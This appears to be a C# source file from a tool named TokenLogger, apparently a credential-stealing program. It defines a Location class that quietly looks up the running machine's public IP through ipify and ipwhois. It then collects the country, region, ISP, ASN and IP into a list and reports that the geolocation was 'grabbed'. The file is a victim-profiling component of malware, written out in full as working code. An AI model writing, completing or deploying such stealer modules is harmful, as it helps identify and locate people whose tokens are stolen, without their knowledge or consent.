using System;
using System.Net.Http;
using System.Collections.Generic;

using Newtonsoft.Json;

namespace TokenLogger
{
    internal class Location
    {
        [JsonProperty("continent")]
        public string Continent { get; set; }

        [JsonProperty("continent_code")]
        public string ContinentCode { get; set; }

        [JsonProperty("country")]
        public string Country { get; set; }

        [JsonProperty("country_code")]
        public string CountryCode { get; set; }

        [JsonProperty("country_capital")]
        public string CountryCapital { get; set; }

        [JsonProperty("timezone_name")]
        public string TimeZone { get; set; }

        [JsonProperty("region")]
        public string Region { get; set; }

        [JsonProperty("isp")]
        public string ISP { get; set; }

        [JsonProperty("asn")]
        public string ASN { get; set; }

        public string IP { get; set; }

        public List<string> LocationInformation { get; set; }

        public List<string> GetLocation()
        {
            this.LocationInformation = new List<string>();

            try
            {
                using (HttpClient httpClient = new HttpClient())
                {
                    this.IP = httpClient.GetStringAsync("https://api64.ipify.org/").Result;

                    string response = httpClient.GetStringAsync($"https://ipwhois.app/json/" + this.IP).Result;
                    Location deserializedObject = JsonConvert.DeserializeObject<Location>(response);

                    this.LocationInformation.Add("  -Continent: " + deserializedObject.Continent);
                    this.LocationInformation.Add("  -Continent Code: " + deserializedObject.ContinentCode);
                    this.LocationInformation.Add("  -Country: " + deserializedObject.Country);
                    this.LocationInformation.Add("  -Country Code: " + deserializedObject.CountryCode);
                    this.LocationInformation.Add("  -Country Capital: " + deserializedObject.CountryCapital);
                    this.LocationInformation.Add("  -Time Zone " + deserializedObject.TimeZone);
                    this.LocationInformation.Add("  -Region: " + deserializedObject.Region);
                    this.LocationInformation.Add("  -ISP: " + deserializedObject.ISP);
                    this.LocationInformation.Add("  -ASN: " + deserializedObject.ASN);
                    this.LocationInformation.Add("  -IP: " + this.IP);
                }

                SetConsoleColor.Color(ConsoleColor.Green);
                Console.WriteLine("[+] Geolocation grabbed successfully!");
            }
            catch (HttpRequestException) 
            {
                SetConsoleColor.Color(ConsoleColor.Red);
                Console.WriteLine("[!] HTTPERROR: Couldn't make request to get geolocation."); 
            }
            catch (JsonException)
            {
                SetConsoleColor.Color(ConsoleColor.Red);
                Console.WriteLine("[!] JSONERROR: Couldn't deserialize object."); 
            }

            return this.LocationInformation;
        }
    }
}